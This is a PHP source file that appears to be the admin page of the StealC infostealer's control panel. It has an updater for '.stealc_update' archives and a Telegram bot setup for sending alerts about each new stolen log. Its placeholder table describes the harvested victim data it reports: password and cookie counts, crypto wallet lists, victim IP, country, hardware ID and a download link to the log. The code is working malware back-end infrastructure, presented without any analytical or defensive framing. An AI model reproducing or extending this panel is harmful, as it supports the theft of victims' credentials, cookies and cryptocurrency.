<?php

include "../config.php";
include_once "app/functions.php";
include_once "app/managers/AccountManager.php";

session_start();

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$page_name = "Admin Panel";

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    header("Location: dashboard");
    exit();
}

include_once 'app/pages/header.php';

?>
<style>
#presets_table td {
  white-space: normal;
  word-wrap: break-word;
}
</style>
<div class="body-wrapper">
    <div class="container-fluid">
        <div class="card card-body py-3">
            <div class="row align-items-center">
                <div class="col-12">
                    <div class="d-sm-flex align-items-center justify-space-between">
                        <h4 class="mb-4 mb-sm-0 card-title"><?php echo $page_name; ?></h4>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="card">
            <ul class="nav nav-pills user-profile-tab" id="pills-tab" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link position-relative rounded-0 d-flex align-items-center justify-content-center bg-transparent fs-3 py-3 active" id="pills-updater-tab" data-bs-toggle="pill" data-bs-target="#pills-updater" type="button" role="tab" aria-controls="pills-updater" aria-selected="true">
                        <svg class="me-2 fs-6" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M4 20q-.825 0-1.412-.587T2 18V6q0-.825.588-1.412T4 4h4q.425 0 .713.288T9 5t-.288.713T8 6H4v12h16V6h-4q-.425 0-.712-.288T15 5t.288-.712T16 4h4q.825 0 1.413.588T22 6v12q0 .825-.587 1.413T20 20zm7-8.4V5q0-.425.288-.712T12 4t.713.288T13 5v6.6l1.9-1.9q.275-.275.7-.275t.7.275t.275.7t-.275.7l-3.6 3.6q-.3.3-.7.3t-.7-.3l-3.6-3.6q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275z"/></svg>
                        <span class="d-none d-md-block">Updater</span>
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button onclick="getTelegramCreds()" class="nav-link position-relative rounded-0 d-flex align-items-center justify-content-center bg-transparent fs-3 py-3" id="pills-telegram-tab" data-bs-toggle="pill" data-bs-target="#pills-telegram" type="button" role="tab" aria-controls="pills-telegram" aria-selected="false" tabindex="-1">  
                        <svg class="me-2 fs-6" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M17.094 7.146c.593-.215.888-.292 1.05-.32q.002.08-.002.122c-.232 2.444-1.251 8.457-1.775 11.255c-.122.655-.216.967-.85.595c-.416-.245-.792-.553-1.196-.817c-1.325-.869-3.221-2.162-3.065-2.084c-1.304-.86-.758-1.386-.03-2.088c.117-.113.24-.231.36-.356c.054-.056.317-.3.687-.645c1.188-1.104 3.484-3.239 3.542-3.486c.01-.04.018-.192-.071-.271c-.09-.08-.223-.053-.318-.031q-.203.046-6.474 4.279q-.918.63-1.664.614l.005.003c-.655-.231-1.308-.43-1.964-.63a66 66 0 0 1-1.3-.405l-.308-.098c4.527-1.972 7.542-3.27 9.053-3.899c2.194-.913 3.496-1.438 4.32-1.738m2.423-1.928a1.8 1.8 0 0 0-.726-.346c-.2-.048-.39-.063-.533-.06c-.477.008-.988.143-1.846.454c-.875.318-2.219.862-4.406 1.771Q9.691 8 2.804 11.001c-.404.161-.773.344-1.065.56c-.27.201-.647.56-.716 1.11c-.052.416.069.8.315 1.103c.214.263.488.423.697.524c.31.15.728.281 1.095.396c.573.18 1.144.363 1.719.539c1.778.544 3.242.992 4.852 2.054c1.181.778 2.34 1.59 3.523 2.366c.432.283.835.608 1.28.87c.488.285 1.106.546 1.86.477c1.138-.105 1.73-1.152 1.97-2.43c.521-2.79 1.557-8.886 1.8-11.432a3.8 3.8 0 0 0-.037-.885a1.66 1.66 0 0 0-.58-1.035"/></svg>    
                        <span class="d-none d-md-block">Telegram Bot</span>
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link position-relative rounded-0 d-flex align-items-center justify-content-center bg-transparent fs-3 py-3" id="pills-disk-tab" data-bs-toggle="pill" data-bs-target="#pills-disk" type="button" role="tab" aria-controls="pills-disk" aria-selected="false" tabindex="-1">  
                        <svg class="me-2 fs-6" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><g fill="none"><path fill="currentColor" d="M13 21.75a.75.75 0 0 0 0-1.5zm-9.828-1.922l.53-.53zM20.828 4.172l-.53.53zM21.25 13a.75.75 0 0 0 1.5 0zM10 3.75h4v-1.5h-4zM2.75 13v-1h-1.5v1zm0-1v-1h-1.5v1zM13 20.25h-3v1.5h3zM21.25 11v1h1.5v-1zm-20 2c0 1.864-.002 3.338.153 4.489c.158 1.172.49 2.121 1.238 2.87l1.06-1.06c-.422-.424-.676-1.004-.811-2.01c-.138-1.027-.14-2.382-.14-4.289zM10 20.25c-1.907 0-3.261-.002-4.29-.14c-1.005-.135-1.585-.389-2.008-.812l-1.06 1.06c.748.75 1.697 1.081 2.869 1.239c1.15.155 2.625.153 4.489.153zm4-16.5c1.907 0 3.262.002 4.29.14c1.005.135 1.585.389 2.008.812l1.06-1.06c-.748-.75-1.697-1.081-2.869-1.239c-1.15-.155-2.625-.153-4.489-.153zM22.75 11c0-1.864.002-3.338-.153-4.489c-.158-1.172-.49-2.121-1.238-2.87l-1.06 1.06c.422.424.676 1.004.811 2.01c.138 1.028.14 2.382.14 4.289zM10 2.25c-1.864 0-3.338-.002-4.489.153c-1.172.158-2.121.49-2.87 1.238l1.06 1.06c.424-.422 1.004-.676 2.01-.811c1.028-.138 2.382-.14 4.289-.14zM2.75 11c0-1.907.002-3.261.14-4.29c.135-1.005.389-1.585.812-2.008l-1.06-1.06c-.75.748-1.081 1.697-1.239 2.869C1.248 7.661 1.25 9.136 1.25 11zM2 12.75h20v-1.5H2zM21.25 12v1h1.5v-1z"/><path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M13.5 7.5H18m-12 10v-2m0-7v-2m3 11v-2m0-7v-2"/><path fill="currentColor" d="M15.584 17.5h-.75zm0 .5l-.488.57c.281.24.695.24.976 0zm1.072.07a.75.75 0 0 0-.975-1.14zm-1.168-1.14a.75.75 0 0 0-.976 1.14zm4.901-.295a.75.75 0 1 0 1.222-.87zm-1.884-2.385c-1.914 0-3.67 1.35-3.67 3.25h1.5c0-.861.857-1.75 2.17-1.75zm-3.67 3.25v.5h1.5v-.5zm1.237 1.07l.584-.5l-.975-1.14l-.585.5zm0-1.14l-.584-.5l-.976 1.14l.584.5zm5.539-1.665c-.666-.935-1.829-1.515-3.106-1.515v1.5c.836 0 1.524.38 1.884.885zM18.495 21v.75zm2.92-2.5h.75zm0-.5l.489-.57a.75.75 0 0 0-.976 0zm-1.071-.07a.75.75 0 0 0 .975 1.14zm1.168 1.14a.75.75 0 0 0 .976-1.14zm-4.901.295a.75.75 0 1 0-1.222.87zm1.884 2.385c1.914 0 3.67-1.35 3.67-3.25h-1.5c0 .861-.857 1.75-2.17 1.75zm3.67-3.25V18h-1.5v.5zm-1.237-1.07l-.584.5l.975 1.14l.585-.5zm0 1.14l.584.5l.976-1.14l-.584-.5zm-5.539 1.665c.666.935 1.829 1.515 3.106 1.515v-1.5c-.836 0-1.524-.38-1.884-.885z"/></g></svg>
                        <span class="d-none d-md-block">Disk Management</span>
                    </button>
                </li>
            </ul>
            
            <div class="card-body">
                <div class="tab-content" id="pills-tabContent">
                    <div class="tab-pane fade active show" id="pills-updater" role="tabpanel" aria-labelledby="pills-account-tab" tabindex="0">  
                        <div class="row">
                            <h4 class="card-title mb-3">Update stealc version</h4>
                            <div class="col-md-12">
                            <label for="update_file" class="form-label">Select update archive</label>
                                <div class="input-group">
                                    <input class="form-control" type="file" id="update_file" accept=".stealc_update">
                                    <button type="button" class="btn btn-primary" onclick="UploadUpdate()">Update</button>
                                </div>
                            </div>
                            <div class="card-body p-4">
                                <h4 class="card-title mb-3">Versions History</h4>
                                
                                <table id="versions_table" class="table text-nowrap mb-0 align-middle">
                                    <thead class="text-dark fs-4">
                                        <tr>
                                            <th>
                                                <h6 class="fs-4 fw-semibold mb-0">Version</h6>
                                            </th>
                                            <th>
                                                <h6 class="fs-4 fw-semibold mb-0">Changes</h6>
                                            </th>
                                            <th>
                                                <h6 class="fs-4 fw-semibold mb-0">Installed</h6>
                                            </th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td>
                                                <p class="mb-0 fw-normal fs-4">2.0.0</p>
                                            </td>
                                            <td>
                                                <span class="badge bg-success-subtle text-success">Active</span>
                                            </td>
                                            <td>
                                                <h6 class="fs-4 fw-semibold mb-0">2025-03-21 15:57:28</h6>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    <div class="tab-pane fade" id="pills-telegram" role="tabpanel" aria-labelledby="pills-telegram-tab" tabindex="0">
                        <div class="row">
                            <div class="col-lg-8 d-flex align-items-stretch">
                                <div class="card w-100 border position-relative overflow-hidden">
                                    <div class="card-body p-4">
                                        <h4 class="card-title">Telegram Configuration</h4>
                                        <p class="card-subtitle mb-4">Configure your telegram bot.</p>

                                        <div class="form-group">
                                            <input type="text" class="form-control" id="telegram_token" aria-describedby="name" placeholder="Enter Telegram Bot Token">
                                        </div>

                                        <br>

                                        <div class="form-group">
                                            <input type="text" class="form-control" id="telegram_chat_ids" aria-describedby="name" placeholder="Chat ID's for groups, channels">
                                        </div>

                                        <div class="row">
                                            <div class="col-12">
                                                <div class="d-flex align-items-center justify-content-end mt-4 gap-6">
                                                    <button class="btn btn-primary" onclick="SaveTelegram()">Save</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>

                        <div class="row">
                            <div class="col-lg-8 d-flex align-items-stretch">
                                <div class="card w-100 border position-relative overflow-hidden">
                                    <div class="card-body p-4">
                                        <h4 class="card-title">Customize Messages</h4>
                                        <p class="card-subtitle mb-4">Customize text for done upload log message</p>

                                        <div class="form-group">
                                            <textarea id="telegram_message" class="form-control" rows="26"></textarea>
                                        </div>

                                        <div class="row">
                                            <div class="col-12">
                                                <div class="d-flex align-items-center justify-content-end mt-4 gap-6">
                                                    <button class="btn btn-primary" onclick="SaveMessageTemplate()">Save</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="col-lg-4 d-flex align-items-stretch">
                                <table id="presets_table" class="table text-nowrap mb-0 align-middle">
                                    <thead class="text-dark fs-4">
                                        <tr>
                                            <th>
                                                <h6 class="fs-4 fw-semibold mb-0">Key</h6>
                                            </th>
                                            <th>
                                                <h6 class="fs-4 fw-semibold mb-0">Value</h6>
                                            </th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td>%LOG_ID%</td>
                                            <td>Log ID</td>
                                        </tr>
                                        <tr>
                                            <td>%HWID%</td>
                                            <td>Unique Hardware ID</td>
                                        </tr>
                                        <tr>
                                            <td>%COUNT_PASSWORDS%</td>
                                            <td>Password Count in Log</td>
                                        </tr>
                                        <tr>
                                            <td>%COUNT_COOKIES%</td>
                                            <td>Cookies Count in Log</td>
                                        </tr>
                                        <tr>
                                            <td>%COUNT_WALLETS%</td>
                                            <td>Cookies Wallets in Log</td>
                                        </tr>
                                        <tr>
                                            <td>%REPEATED%</td>
                                            <td>Log Duplicated or not?</td>
                                        </tr>
                                        <tr>
                                            <td>%BUILD%</td>
                                            <td>Build Tag</td>
                                        </tr>
                                        <tr>
                                            <td>%IP%</td>
                                            <td>Log IP</td>
                                        </tr>
                                        <tr>
                                            <td>%COUNTRY%</td>
                                            <td>Country by IP</td>
                                        </tr>
                                        <tr>
                                            <td>%DATE%</td>
                                            <td>Launch Date</td>
                                        </tr>
                                        <tr>
                                            <td>%OS%</td>
                                            <td>Windows Version</td>
                                        </tr>
                                        <tr>
                                            <td>%WALLETS_LIST%</td>
                                            <td>List of Wallets</td>
                                        </tr>
                                        <tr>
                                            <td>%MARKERS_LIST%</td>
                                            <td>List of Markers</td>
                                        </tr>
                                        <tr>
                                            <td>%DOWNLOAD_URL%</td>
                                            <td>URL to Log Download</td>
                                        </tr>
                                        
                                        
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>

                    <div class="tab-pane fade" id="pills-disk" role="tabpanel" aria-labelledby="pills-disk-tab" tabindex="0">  
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
</div>
</div>

<div class="dark-transparent sidebartoggler"></div>

<script>var server_time = "<?php echo (new DateTime())->format('Y-m-d H:i:s'); ?>";</script>

<?php include_once 'app/pages/footer.php'; ?>

<script src="assets/js/admin.js"></script>

</body>
</html>